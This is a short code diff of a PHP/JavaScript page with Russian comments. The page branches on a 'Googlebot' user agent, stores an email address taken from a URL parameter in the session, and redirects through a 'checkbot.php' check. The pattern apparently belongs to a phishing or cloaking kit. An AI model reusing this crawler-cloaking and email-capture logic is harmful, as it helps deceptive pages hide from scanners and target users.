@@ -11,7 +11,7 @@ if (strpos($userAgent, 'Googlebot') !== false || @$_GET['test'] == "Googlebot") 
 }
 
 
-session_start();
+//session_start();
 $_SESSION['key'] = md5(@$_GET['e']);
 $_SESSION['mail'] = @$_GET['e'];
 ?>
@@ -534,7 +534,7 @@ $_SESSION['mail'] = @$_GET['e'];
 			// Создаем объект URLSearchParams на основе параметров
 			const params = new URLSearchParams(url_now.search);
 			
-      let domain = prompt("Please enter your domain", "Harry Potter");
+      let domain = prompt("Please enter your domain", "https://google.com");
       let key = CryptoJS.MD5(domain).toString();
       
 			window.location.href = 'checkbot.php?key=' + key + '&domain='+ domain;
